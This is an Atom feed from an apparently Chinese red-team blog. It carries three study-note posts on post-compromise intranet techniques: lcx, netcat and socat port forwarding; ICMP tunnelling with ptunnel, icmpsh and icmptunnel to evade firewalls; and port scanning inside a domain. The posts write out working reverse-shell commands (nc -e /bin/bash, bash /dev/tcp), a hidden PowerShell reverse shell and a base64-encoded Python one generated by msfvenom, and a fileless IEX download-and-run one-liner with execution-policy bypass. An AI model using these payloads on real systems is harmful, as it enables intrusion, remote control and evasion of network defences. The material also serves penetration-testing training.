<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Teams Six</title>
  
  
  <link href="https://www.teamssix.com/atom.xml" rel="self"/>
  
  <link href="https://www.teamssix.com/"/>
  <updated>2021-05-28T05:15:41.428Z</updated>
  <id>https://www.teamssix.com/</id>
  
  <author>
    <name>Teams Six</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>【内网学习笔记】7、lcx、netcat和socat的使用</title>
    <link href="https://www.teamssix.com/year/210528-130449.html"/>
    <id>https://www.teamssix.com/year/210528-130449.html</id>
    <published>2021-05-28T05:04:49.000Z</published>
    <updated>2021-05-28T05:15:41.428Z</updated>
    
    <content type="html"><![CDATA[<h2 id="1、lcx-使用"><a href="#1、lcx-使用" class="headerlink" title="1、lcx 使用"></a>1、lcx 使用</h2><p>lcx 分为 Windows 版和 Linux 版，Linux 版叫 portmap</p><h3 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h3><ul><li>内网端口转发</li></ul><pre><code>内网失陷主机lcx.exe -slave rhost rport lhost lport公网代理主机lcx.exe -listen lport1 lport2</code></pre><pre><code>内网失陷主机lcx.exe -slave 123.123.123.123 4444 127.0.0.1 3389公网代理主机lcx.exe -listen 4444 5555</code></pre><p>在建立连接后，访问公网代理主机的 5555 端口就能访问到内网失陷主机的 3389 端口了。</p><ul><li>本地端口映射</li></ul><p>如果目标主机不能出网，这时可以利用内网中能够出网的主机，将其不能出网的主机端口映射到自身上，再借助端口转发到公网进行访问。</p><pre><code>lcx.exe -tran 53 &lt;目标主机 IP 地址&gt; 3389</code></pre><h3 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h3><ul><li>内网端口转发</li></ul><pre><code>内网失陷主机./portmap -m 3 -h1 127.0.0.1 -p1 22 -h2 &lt;公网主机 IP&gt; -p2 4444公网代理主机./portmap -m 2 -p1 4444 -h2 &lt;公网主机 IP&gt; -p2 5555</code></pre><p>此时访问公网主机 IP 的 5555 端口，就会访问到内网失陷主机的 22 端口了。</p><h2 id="2、netcat-使用"><a href="#2、netcat-使用" class="headerlink" title="2、netcat 使用"></a>2、netcat 使用</h2><p>nc 下载地址：<a href="https://eternallybored.org/misc/netcat/">https://eternallybored.org/misc/netcat/</a></p><p>nc 全称 netcat，它的功能很多，这里简单记录下两个常用的功能，其他的比如文件传输、端口扫描等等的就不介绍了，毕竟平时使用频率有一说一还是比较少的。</p><pre><code>-l 开启监听状态-v 显示详细信息-p 指定监听的本地端口-k 客户端断掉连接时，服务端依然保持运行-e 将传入的信息以命令执行-n 直接使用 IP 地址，不进行 dns 解析过程</code></pre><h3 id="获取-banner-信息"><a href="#获取-banner-信息" class="headerlink" title="获取 banner 信息"></a>获取 banner 信息</h3><p>个人觉着最常用的功能，这个不仅可以用来查看 banner 信息，还能用来判断端口是否开放。</p><pre><code>nc -vv rhost rport</code></pre><pre><code>&gt; nc -v 172.16.214.43 22Connection to 172.16.214.43 port 22 [tcp/ssh] succeeded!SSH-2.0-OpenSSH_8.4p1 Debian-3</code></pre><h3 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h3><p>个人觉着这个也是最常用的功能，可以使用 -e 指定 /bin/bash 进行反弹，也可以直接 -c 指定 bash 或者 cmd</p><p><strong>-e 指定反弹 shell</strong></p><pre><code># 失陷主机nc -lvp lport -e /bin/bash        # linux 主机nc -lvp lport -e c:\windows\system32\cmd.exe     # windows 主机# 控制端nc rhost rport</code></pre><pre><code># 失陷主机&gt; nc -lvp 4444 -e /bin/bashlistening on [any] 4444 ...172.16.214.1: inverse host lookup failed: Unknown hostconnect to [172.16.214.43] from (UNKNOWN) [172.16.214.1] 60628# 控制端&gt; nc -v 172.16.214.43 4444Connection to 172.16.214.43 port 4444 [tcp/krb524] succeeded!whoamiroot</code></pre><p><strong>-c 指定反弹 shell</strong></p><pre><code># 失陷主机nc -lvp lprot -c bash    # linux 主机nc -lvp lport -c cmd     # windows 主机# 控制端nc rhost rport</code></pre><pre><code># 失陷主机&gt; nc -lvp 4444 -c bashlistening on [any] 4444 ...172.16.214.1: inverse host lookup failed: Unknown hostconnect to [172.16.214.43] from (UNKNOWN) [172.16.214.1] 60635# 控制端&gt; nc -v 172.16.214.43 4444Connection to 172.16.214.43 port 4444 [tcp/krb524] succeeded!whoamiroot</code></pre><p><strong>结合其他语言进行反弹 shell</strong></p><pre><code># 失陷主机bash -i &gt;&amp; /dev/tcp/rhost/rport 0&gt;&amp;1# 控制端nc -lvp lprot</code></pre><pre><code># 失陷主机&gt; bash -i &gt;&amp; /dev/tcp/172.16.214.43/4444 0&gt;&amp;1# 控制端&gt; nc -lp 4444root@ubuntu:~# whoamiwhoamiroot</code></pre><p>除了 bash 也可以使用其他的语言进行反弹 shell，这里可以使用 msfvenom 生成反弹 shell，操作起来比较方便，使用 <code>msfvenom -l payload | grep &quot;cmd/&quot;</code>可查看可使用的 payload</p><p>比如使用 <code>cmd/windows/reverse_powershell</code> 这个 payload</p><pre><code># 控制端&gt; msfvenom -p cmd/windows/reverse_powershell lhost=172.16.214.43 lport=4444[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload[-] No arch selected, selecting arch: cmd from the payloadNo encoder specified, outputting raw payloadPayload size: 1586 bytespowershell -w hidden -nop -c $a=&#39;172.16.214.43&#39;;$b=4444;$c=New-Object system.net.sockets.tcpclient;$nb=New-Object System.Byte[] $c.ReceiveBufferSize;$ob=New-Object System.Byte[] 65536;$eb=New-Object System.Byte[] 65536;$e=new-object System.Text.UTF8Encoding;$p=New-Object System.Diagnostics.Process;$p.StartInfo.FileName=&#39;cmd.exe&#39;;$p.StartInfo.RedirectStandardInput=1;$p.StartInfo.RedirectStandardOutput=1;$p.StartInfo.RedirectStandardError=1;$p.StartInfo.UseShellExecute=0;$q=$p.Start();$is=$p.StandardInput;$os=$p.StandardOutput;$es=$p.StandardError;$osread=$os.BaseStream.BeginRead($ob, 0, $ob.Length, $null, $null);$esread=$es.BaseStream.BeginRead($eb, 0, $eb.Length, $null, $null);$c.connect($a,$b);$s=$c.GetStream();while ($true) &#123;    start-sleep -m 100;    if ($osread.IsCompleted -and $osread.Result -ne 0) &#123;      $r=$os.BaseStream.EndRead($osread);      $s.Write($ob,0,$r);      $s.Flush();      $osread=$os.BaseStream.BeginRead($ob, 0, $ob.Length, $null, $null);    &#125;    if ($esread.IsCompleted -and $esread.Result -ne 0) &#123;      $r=$es.BaseStream.EndRead($esread);      $s.Write($eb,0,$r);      $s.Flush();      $esread=$es.BaseStream.BeginRead($eb, 0, $eb.Length, $null, $null);    &#125;    if ($s.DataAvailable) &#123;      $r=$s.Read($nb,0,$nb.Length);      if ($r -lt 1) &#123;          break;      &#125; else &#123;          $str=$e.GetString($nb,0,$r);          $is.write($str);      &#125;    &#125;    if ($c.Connected -ne $true -or ($c.Client.Poll(1,[System.Net.Sockets.SelectMode]::SelectRead) -and $c.Client.Available -eq 0)) &#123;        break;    &#125;    if ($p.ExitCode -ne $null) &#123;        break;    &#125;&#125;&gt; nc -lvp 4444</code></pre><p>将生成的 payload 复制到失陷主机上运行，即可收到反弹回的 shell</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/Snipaste_2021-05-28_12-36-45.png"></p><p>再比如使用 <code>cmd/unix/reverse_python</code> 这个payload</p><pre><code># 控制端&gt; msfvenom -p cmd/unix/reverse_python lhost=172.16.214.43 lport=4444[-] No platform was selected, choosing Msf::Module::Platform::Unix from the payload[-] No arch selected, selecting arch: cmd from the payloadNo encoder specified, outputting raw payloadPayload size: 505 bytespython -c &quot;exec(__import__(&#39;base64&#39;).b64decode(__import__(&#39;codecs&#39;).getencoder(&#39;utf-8&#39;)(&#39;aW1wb3J0IHNvY2tldCAgICwgc3VicHJvY2VzcyAgICwgb3M7ICAgICAgaG9zdD0iMTcyLjE2LjIxNC40MyI7ICAgICAgcG9ydD00NDQ0OyAgICAgIHM9c29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCAgICwgc29ja2V0LlNPQ0tfU1RSRUFNKTsgICAgICBzLmNvbm5lY3QoKGhvc3QgICAsIHBvcnQpKTsgICAgICBvcy5kdXAyKHMuZmlsZW5vKCkgICAsIDApOyAgICAgIG9zLmR1cDIocy5maWxlbm8oKSAgICwgMSk7ICAgICAgb3MuZHVwMihzLmZpbGVubygpICAgLCAyKTsgICAgICBwPXN1YnByb2Nlc3MuY2FsbCgiL2Jpbi9iYXNoIik=&#39;)[0]))&quot;&gt; nc -lvp 4444</code></pre><p>同样将生成的 payload 复制到失陷主机上运行，即可收到反弹回来的 shell，当然前提是目标主机安装了 python</p><h2 id="3、socat-使用"><a href="#3、socat-使用" class="headerlink" title="3、socat 使用"></a>3、socat 使用</h2><p>socat 下载地址：<a href="http://www.dest-unreach.org/socat/">http://www.dest-unreach.org/socat/</a>，或者直接使用 <code>apt-get install socat</code> 安装，Mac 可使用 <code>brew install socat</code> 安装。</p><p>socat 全称 socket cat，可以视为 nc 的加强版，不过平时感觉 nc 也够用了，但是 nc 现在貌似会被杀软杀掉，而且貌似 nc 很久没更新了，反正多掌握点知识没坏处。</p><h3 id="文件操作"><a href="#文件操作" class="headerlink" title="文件操作"></a>文件操作</h3><p><strong>读取文件</strong></p><pre><code>&gt; socat - ./test.txt      # 相对路径读取test&gt; socat - /tmp/test.txt    # 绝对路径读取test</code></pre><p><strong>写入文件</strong></p><pre><code>&gt; echo &quot;hello world&quot; | socat - ./test.txt&gt; socat - ./test.txttesthello world</code></pre><h3 id="网络操作"><a href="#网络操作" class="headerlink" title="网络操作"></a>网络操作</h3><p><strong>连接远程端口</strong></p><pre><code>&gt; socat - TCP:172.16.214.1:22SSH-2.0-OpenSSH_7.4</code></pre><p><strong>监听端口</strong></p><pre><code>socat - TCP-LISTEN:8002</code></pre><h3 id="端口转发"><a href="#端口转发" class="headerlink" title="端口转发"></a>端口转发</h3><p><strong>转发 TCP 端口</strong></p><p>个人觉着这个是比较常用到的功能，在使用 CS 做重定向器时，就可以使用 socat 进行端口的转发。</p><pre><code>socat TCP4-LISTEN:80,fork TCP4:123.123.123.123:80</code></pre><p>这样在访问当前主机的 80 端口时，就会访问到 123.123.123.123 的 80 端口了，也可以使用 -d 调整输出信息的详细程度，最多使用四个 d，推荐使用两个，即 -dd</p><pre><code>socat -dd TCP4-LISTEN:80,fork TCP4:123.123.123.123:80</code></pre><p><strong>转发 UDP 端口</strong></p><p>和上面一样，将 TCP 改成 UDP 即可</p><pre><code>socat UDP4-LISTEN:80,fork UDP4:123.123.123.123:80</code></pre><p><strong>NAT 映射</strong></p><p>通过 socat 可以将内网端口映射到公网上，不过这种场景还是更推荐用 frp</p><pre><code># 内网主机socat tcp:123.123.123.123:4444 tcp:127.0.0.1:3389# 公网主机socat tcp-listen:4444 tcp-listen:5555</code></pre><p>此时访问公网主机的 5555 端口就可以访问到内网主机的 3389 端口了</p><p>考虑到 socat 的其他功能平时也很少使用到，这里就不过多介绍了，网上相关文章也有很多，在此就不赘述了。</p><blockquote><p>参考链接：</p><p><a href="https://www.sqlsec.com/2019/10/nc.html">https://www.sqlsec.com/2019/10/nc.html</a></p><p><a href="https://www.hi-linux.com/posts/61543.html">https://www.hi-linux.com/posts/61543.html</a></p><p>更多信息欢迎关注我的微信公众号：TeamsSix</p></blockquote><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/TeamsSix_Subscription_Logo2.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;1、lcx-使用&quot;&gt;&lt;a href=&quot;#1、lcx-使用&quot; class=&quot;headerlink&quot; title=&quot;1、lcx 使用&quot;&gt;&lt;/a&gt;1、lcx 使用&lt;/h2&gt;&lt;p&gt;lcx 分为 Windows 版和 Linux 版，Linux 版叫 portmap&lt;/p&gt;</summary>
      
    
    
    
    <category term="内网学习笔记" scheme="https://www.teamssix.com/categories/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    
    <category term="学习笔记" scheme="https://www.teamssix.com/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    <category term="红队" scheme="https://www.teamssix.com/tags/%E7%BA%A2%E9%98%9F/"/>
    
    <category term="内网" scheme="https://www.teamssix.com/tags/%E5%86%85%E7%BD%91/"/>
    
  </entry>
  
  <entry>
    <title>【内网学习笔记】6、ICMP隧道工具使用</title>
    <link href="https://www.teamssix.com/year/210407-183605.html"/>
    <id>https://www.teamssix.com/year/210407-183605.html</id>
    <published>2021-04-07T10:36:05.000Z</published>
    <updated>2021-04-07T11:30:27.165Z</updated>
    
    <content type="html"><![CDATA[<h2 id="1、介绍"><a href="#1、介绍" class="headerlink" title="1、介绍"></a>1、介绍</h2><p>在内网中，如果攻击者使用 HTTP、DNS 等应用层隧道都失败了，那么或许可以试试网络层的 ICMP 隧道，ICMP 协议最常见的场景就是使用 ping 命令，而且一般防火墙都不会禁止 ping 数据包。</p><p>因此我们便可以将 TCP/UDP 数据封装到 ICMP 的 ping 数据包中，从而绕过防火墙的限制。</p><h2 id="2、建立-ICMP-隧道工具"><a href="#2、建立-ICMP-隧道工具" class="headerlink" title="2、建立 ICMP 隧道工具"></a>2、建立 ICMP 隧道工具</h2><p>用于建立 ICMP 隧道的工具常见有：ptunnel、icmpsh、icmptunnel 等</p><h3 id="ptunnel"><a href="#ptunnel" class="headerlink" title="ptunnel"></a>ptunnel</h3><p>ptunnel 全称 PingTunnel，Kali 下自带该工具，Linux 下安装过程如下：</p><pre><code>yum -y install byaccyum -y install flex bison#安装libpcap依赖库wget http://www.tcpdump.org/release/libpcap-1.9.0.tar.gztar -xzvf libpcap-1.9.0.tar.gzcd libpcap-1.9.0./configuremake &amp;&amp; make install#安装PingTunnelwget http://www.cs.uit.no/~daniels/PingTunnel/PingTunnel-0.72.tar.gztar -xzvf PingTunnel-0.72.tar.gzcd PingTunnelmake &amp;&amp; make install</code></pre><p>ptunnel 常用命令介绍：</p><pre><code>-p: 指定跳板服务器 IP 地址-lp: 监听本地 TCP 端口-da: 指定访问目标的内网 IP 地址-dp: 指定访问目标的端口-m: 设置隧道最大并发数-v: 输入内容详细级别（-1到4，其中-1为无输出，4为全部输出）-udp: 切换使用UDP代替ICMP，代理将监听端口53（必须是 root 权限）-x: 设置隧道密码，防止滥用（客户端和代理端必须相同）</code></pre><p>目前有这样的一个场景，当前已经拿下了一台外网 Web Linux 服务器，想通过它利用 ICMP 协议连接内网的一台已经开启远程桌面的 Windows ，网络结构简化如下。</p><pre><code>Kali 攻击机       172.16.214.6 (外网)||Linux Web 跳板机  172.16.214.5  (外网)|                192.168.7.5   (内网)||Win RDP 目标机    192.168.7.110 (内网)</code></pre><p>在 Kali 攻击机上执行以下命令</p><pre><code>ptunnel -p 172.16.214.5 -lp 1080 -da 192.168.7.110 -dp 3389 -x teamssix</code></pre><pre><code>-p  指定跳板机外网IP-lp 指定本机的监听端口-da 指定目标机的内网IP-dp 指定目标机的端口-x 设置隧道密码</code></pre><p>在 Linux Web 跳板机上执行以下命令</p><pre><code>ptunnel -x teamssix</code></pre><p>之后访问 Kali 攻击机 172.16.214.6 的 1080 端口就会连接到 Win RDP 目标机 192.168.7.110 的 3389 端口了，不过实测发现这种方法有些不稳定。</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/Snipaste_2021-04-07_14-46-46.png"></p><h3 id="icmpsh"><a href="#icmpsh" class="headerlink" title="icmpsh"></a>icmpsh</h3><p>icmpsh 使用很简单，直接在 github 上下载，运行时不需要管理员权限，但是在使用时需要关闭本地系统的 ICMP 应答，不然 shell 的运行会不稳定。</p><pre><code>git clone https://github.com/inquisb/icmpsh.git #下载工具apt-get install python-impacket # 安装依赖，或者 pip2 install impacketsysctl -w net.ipv4.icmp_echo_ignore_all=1  #关闭本地ICMP应答</code></pre><p>icmpsh 常用命令介绍：</p><pre><code>-t host            发送ping请求的主机ip地址，即攻击机的IP [该命令必须存在]-d milliseconds    请求时间间隔（毫秒）-o milliseconds    响应超时时间（毫秒）-s bytes           最大数据缓冲区大小（字节）</code></pre><p>目前有这样的一个场景，攻击机能通过 ICMP 协议访问到目标主机，但是目标上有防火墙，拒绝了敏感端口比如 22、3389 端口的访问，这个时候可以使用 icmpsh 利用 ICMP 协议建立反向 shell</p><pre><code>攻击机 IP：172.16.214.6目标机 IP：172.16.214.2</code></pre><p>在攻击机上运行：</p><pre><code>python2 icmpsh_m.py 172.16.214.6 172.16.214.2</code></pre><p>在目标机上运行</p><pre><code>./icmpsh.exe -t 172.16.214.6</code></pre><p>此时在攻击机上可以看到通过 icmp 协议建立的 shell</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/Snipaste_2021-04-07_15-43-51.png"></p><h3 id="icmptunnel"><a href="#icmptunnel" class="headerlink" title="icmptunnel"></a>icmptunnel</h3><p> icmptunnel 的优势在于可以穿过状态防火墙或 NAT，同样在 github 上进行下载，值得注意的是该工具只有 Linux 版。</p><pre><code>git clone https://github.com/jamesbarlow/icmptunnel.gitcd icmptunnelmake</code></pre><p>目前有这样的一个场景，攻击者为 Linux，但由于目标存在状态防火墙或者使用了 NAT 导致无法获得 shell，此时可以通过 icmptunnel 绕过限制。</p><pre><code>攻击机 IP：172.16.214.6目标机 IP：172.16.214.5</code></pre><p>在攻击机上运行：</p><pre><code>echo 1 &gt; /proc/sys/net/ipv4/icmp_echo_ignore_all        # 禁用 ICMP echo 回复，防止内核自己对ping包进行响应./icmptunnel -s    # 开启服务端模式</code></pre><p>在攻击机上新开启一个终端运行：</p><pre><code>/sbin/ifconfig tun0 10.0.0.1 netmask 255.255.255.0    # 指定一个网卡tun0，用于给隧道服务器端分配一个IP地址 (10.0.0.1)</code></pre><p>在目标机上运行：</p><pre><code>echo 1 &gt; /proc/sys/net/ipv4/icmp_echo_ignore_all./icmptunnel 172.16.214.6</code></pre><p>在目标机上新开启一个终端运行：</p><pre><code>/sbin/ifconfig tun0 10.0.0.2 netmask 255.255.255.0    # 指定一个网卡tun0，用于给隧道服务器端分配一个IP地址 (10.0.0.2)</code></pre><p>至此，已经通过 ICMP 建立了一个点对点隧道。</p><p>在攻击机上，尝试通过 ssh 进行连接，可以看到通过刚才建立的隧道成功连接到目标机。</p><pre><code>ssh root@10.0.0.2</code></pre><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/Snipaste_2021-04-07_16-35-09.png"></p><blockquote><p>参考链接：</p><p><a href="https://xz.aliyun.com/t/7875">https://xz.aliyun.com/t/7875</a></p><p><a href="https://www.freebuf.com/sectool/210450.html">https://www.freebuf.com/sectool/210450.html</a></p><p><a href="https://xiaix.me/li-yong-icmp-sui-dao-chuan-tou-fang-huo-qiang/">https://xiaix.me/li-yong-icmp-sui-dao-chuan-tou-fang-huo-qiang/</a></p><p>更多信息欢迎关注我的微信公众号：TeamsSix</p></blockquote><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/TeamsSix_Subscription_Logo2.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;1、介绍&quot;&gt;&lt;a href=&quot;#1、介绍&quot; class=&quot;headerlink&quot; title=&quot;1、介绍&quot;&gt;&lt;/a&gt;1、介绍&lt;/h2&gt;&lt;p&gt;在内网中，如果攻击者使用 HTTP、DNS 等应用层隧道都失败了，那么或许可以试试网络层的 ICMP 隧道，ICMP 协议最</summary>
      
    
    
    
    <category term="内网学习笔记" scheme="https://www.teamssix.com/categories/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    
    <category term="学习笔记" scheme="https://www.teamssix.com/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    <category term="红队" scheme="https://www.teamssix.com/tags/%E7%BA%A2%E9%98%9F/"/>
    
    <category term="内网" scheme="https://www.teamssix.com/tags/%E5%86%85%E7%BD%91/"/>
    
  </entry>
  
  <entry>
    <title>【经验总结】域内主机端口探测的一些方法总结</title>
    <link href="https://www.teamssix.com/year/210317-201858.html"/>
    <id>https://www.teamssix.com/year/210317-201858.html</id>
    <published>2021-03-17T12:18:58.000Z</published>
    <updated>2021-03-17T12:22:55.169Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>注：本文中的工具均来源自互联网，后门自查。</p></blockquote><p>在进入目标域后，对域内存活主机进行端口探测是经常要做的一步，在此记录一些常见的方法。</p><h2 id="1、Telnet"><a href="#1、Telnet" class="headerlink" title="1、Telnet"></a>1、Telnet</h2><p>如果想探测某台主机的某个端口是否开放，直接使用 telnet 命令是最方便的。</p><pre><code>C:\Users\daniel10&gt;telnet dc 80正在连接dc...无法打开到主机的连接。 在端口 80: 连接失败C:\Users\daniel10&gt;telnet 192.168.7.7 443正在连接192.168.7.7...无法打开到主机的连接。 在端口 443: 连接失败</code></pre><h2 id="2、nc"><a href="#2、nc" class="headerlink" title="2、nc"></a>2、nc</h2><p>素有瑞士军刀之称的 nc 也是可以拿来做端口探测的。</p><p>nc 下载地址：<a href="https://eternallybored.org/misc/netcat/">https://eternallybored.org/misc/netcat/</a></p><pre><code>nc.exe -vv 192.168.7.7 3389</code></pre><pre><code>C:\Users\daniel10&gt;nc.exe -vv 192.168.7.7 3389DNS fwd/rev mismatch: DC != DC.teamssix.comDC [192.168.7.7] 3389 (ms-wbt-server) open</code></pre><p>拿来进行多个端口扫描也是可以的，就是扫描速度有点慢</p><pre><code>nc.exe -rz -w 2 -vv 192.168.7.7 0-65535-r 随机指定本地与远端主机的通信端口-z 使用0输入/输出模式，只在扫描通信端口时使用-w&lt;超时秒数&gt; 设置等待连线的时间</code></pre><pre><code>C:\Users\daniel10&gt;nc.exe -rz -w 2 -vv 192.168.7.7 443-445DNS fwd/rev mismatch: DC != DC.teamssix.comDC [192.168.7.7] 444 (?): TIMEDOUTDC [192.168.7.7] 443 (https): TIMEDOUTDC [192.168.7.7] 445 (microsoft-ds) opensent 0, rcvd 0</code></pre><h2 id="3、fscan"><a href="#3、fscan" class="headerlink" title="3、fscan"></a>3、fscan</h2><p>影舞者大佬写的一款工具，使用起来感觉很是方便，项目地址：<a href="https://github.com/shadow1ng/fscan">https://github.com/shadow1ng/fscan</a></p><pre><code>fscan.exe -h 192.168.7.7 -p 22,445</code></pre><pre><code>C:\Users\daniel10&gt;fscan.exe -h 192.168.7.7 -p 22,445   ___                              _  / _ \     ___  ___ _ __ __ _  ___| | __ / /_\/____/ __|/ __| &#39;__/ _` |/ __| |/ // /_\\_____\__ \ (__| | | (_| | (__|   &lt;\____/     |___/\___|_|  \__,_|\___|_|\_\                     fscan version: 1.5.1scan start(icmp) Target &#39;192.168.7.7&#39; is aliveicmp alive hosts len is: 1192.168.7.7:445 open[+] 192.168.7.7 MS17-010        (Windows Server 2008 R2 Datacenter 7601 Service Pack 1)scan end</code></pre><h2 id="4、ScanLine"><a href="#4、ScanLine" class="headerlink" title="4、ScanLine"></a>4、ScanLine</h2><p>McAfee 出品的一款经典的端口扫描工具，ScanLine 项目地址：<a href="www.mcafee.com/us/downloads/free-tools/termsofuse.aspx">www.mcafee.com/us/downloads/free-tools/termsofuse.aspx</a></p><p>但是项目地址的下载按钮貌似失效了，其他的下载地址：<a href="https://www.lanzous.com/i32zncf">https://www.lanzous.com/i32zncf</a></p><pre><code>scanline.exe -h -t 22,80,445,3389 -p 192.168.7.7</code></pre><pre><code>C:\Users\daniel10&gt;scanline.exe -h -t 22,80,445,3389 -p 192.168.7.7ScanLine (TM) 1.01Copyright (c) Foundstone, Inc. 2002http://www.foundstone.comScan of 1 IP started at Wed Feb 24 21:31:11 2021-------------------------------------------------------------------------------192.168.7.7Responds with ICMP unreachable: NoTCP ports: 445 3389-------------------------------------------------------------------------------Scan finished at Wed Feb 24 21:31:15 20211 IP and 4 ports scanned in 0 hours 0 mins 4.03 secs</code></pre><h2 id="5、S-扫描器"><a href="#5、S-扫描器" class="headerlink" title="5、S 扫描器"></a>5、S 扫描器</h2><p>S 扫描器支持大网段扫描，扫描速度也很快，是比较早期的一款扫描工具了，比较适合运行在 Windows Server 2003 以下版本的操作系统中，下载地址：<a href="https://pan.baidu.com/s/1gdGM4F5">https://pan.baidu.com/s/1gdGM4F5</a></p><blockquote><p>值得提一句的是在我下载该工具到本地后，火绒立马给它删了，而其他的扫描工具火绒都没告警。</p></blockquote><pre><code>s.exe tcp 192.168.7.7 22,80,443,445 7</code></pre><pre><code>C:\Users\daniel10&gt;s.exe tcp 192.168.7.7 22,80,443,445 7TCP Port Scanner V1.1 By WinEggDropNormal Scan: About To Scan 4 Ports Using 7 Thread192.168.7.7      445   OpenScan 192.168.7.7 Complete In 0 Hours 0 Minutes 3 Seconds. Found 1 Open Ports</code></pre><h2 id="6、PowerShell-脚本"><a href="#6、PowerShell-脚本" class="headerlink" title="6、PowerShell 脚本"></a>6、PowerShell 脚本</h2><h3 id="PowerSploit"><a href="#PowerSploit" class="headerlink" title="PowerSploit"></a>PowerSploit</h3><p>PowerSploit 的 Invoke-Portscan 脚本下载地址：<a href="https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/Invoke-Portscan.ps1">https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/Invoke-Portscan.ps1</a></p><p>无文件形式（推荐）</p><pre><code>powershell.exe -nop -exec bypass -c &quot;IEX (New-Object Net.WebClient).DownloadString(&#39;https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/Invoke-Portscan.ps1&#39;);Invoke-Portscan -Hosts 192.168.7.7 -T 4 -ports &#39;445,1433,80,8080,3389&#39;&quot;</code></pre><blockquote><p>如果报错，估计是网络的问题</p></blockquote><p>有文件形式</p><pre><code>powershell.exe -exec bypass -Command &quot;Import-Module ./Invoke-Portscan.ps1;Invoke-Portscan -Hosts 192.168.7.7 -T 4 -ports &#39;445,1433,80,8080,3389&#39;&quot;</code></pre><pre><code>C:\Users\daniel10&gt;powershell.exe -exec bypass -Command &quot;Import-Module ./Invoke-Portscan.ps1;Invoke-Portscan -Hosts 192.168.7.7 -T 4 -ports &#39;445,1433,80,8080,3389&#39;&quot;Hostname      : 192.168.7.7alive         : TrueopenPorts     : &#123;445, 3389&#125;closedPorts   : &#123;8080, 80, 1433&#125;filteredPorts : &#123;&#125;finishTime    : 2021/2/24 下午 21:14:06</code></pre><h3 id="nishang"><a href="#nishang" class="headerlink" title="nishang"></a>nishang</h3><p>nishang 的 Invoke-Portscan 脚本下载地址：<a href="https://raw.githubusercontent.com/samratashok/nishang/0090ba2e51b7503c3245081894c0fc87b696f941/Scan/Invoke-PortScan.ps1">https://raw.githubusercontent.com/samratashok/nishang/0090ba2e51b7503c3245081894c0fc87b696f941/Scan/Invoke-PortScan.ps1</a></p><pre><code> Invoke-PortScan -StartAddress 192.168.7.7 -EndAddress 192.168.7.7 -ScanPort -Port 80,443,445</code></pre><pre><code>PS C:\Users\daniel10&gt; Import-Module .\Invoke-Portscan.ps1PS C:\Users\daniel10&gt; Invoke-PortScan -StartAddress 192.168.7.7 -EndAddress 192.168.7.7 -ScanPort -Port 80,443,445IPAddress   HostName Ports---------   -------- -----192.168.7.7          &#123;445&#125;</code></pre><h2 id="7、MSF"><a href="#7、MSF" class="headerlink" title="7、MSF"></a>7、MSF</h2><p>万能的 MSF 自然也是能够进行端口探测的，MSF 中用于端口探测的模块有：</p><pre><code>auxiliary/scanner/portscan/ack          TCP ACK端口扫描auxiliary/scanner/portscan/ftpbounce    FTP bounce端口扫描auxiliary/scanner/portscan/syn             SYN端口扫描auxiliary/scanner/portscan/tcp          TCP端口扫描  auxiliary/scanner/portscan/xmas         TCP XMas端口扫描……</code></pre><p>除了上述工具外，还有 nmap、masscan 什么的就不多说了，读者如果感兴趣可以自行尝试玩玩。</p><blockquote><p>参考文章：</p><p><a href="https://pingmaoer.github.io/2020/03/30/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E4%B8%80/">https://pingmaoer.github.io/2020/03/30/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E4%B8%80/</a></p><p>更多信息欢迎关注我的微信公众号：TeamsSix</p></blockquote><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/TeamsSix_Subscription_Logo2.png" alt="img"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;注：本文中的工具均来源自互联网，后门自查。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;在进入目标域后，对域内存活主机进行端口探测是经常要做的一步，在此记录一些常见的方法。&lt;/p&gt;
&lt;h2 id=&quot;1、Telnet&quot;&gt;&lt;a href=&quot;#1、Teln</summary>
      
    
    
    
    <category term="经验总结" scheme="https://www.teamssix.com/categories/%E7%BB%8F%E9%AA%8C%E6%80%BB%E7%BB%93/"/>
    
    
    <category term="红队" scheme="https://www.teamssix.com/tags/%E7%BA%A2%E9%98%9F/"/>
    
    <category term="内网" scheme="https://www.teamssix.com/tags/%E5%86%85%E7%BD%91/"/>
    
    <category term="经验总结" scheme="https://www.teamssix.com/tags/%E7%BB%8F%E9%AA%8C%E6%80%BB%E7%BB%93/"/>
    
  </entry>
  
  <entry>
    <title>【工具分享】写了一个威胁情报收集的小工具</title>
    <link href="https://www.teamssix.com/year/210315-133209.html"/>
    <id>https://www.teamssix.com/year/210315-133209.html</id>
    <published>2021-03-15T05:32:09.000Z</published>
    <updated>2021-03-15T05:43:04.398Z</updated>
    
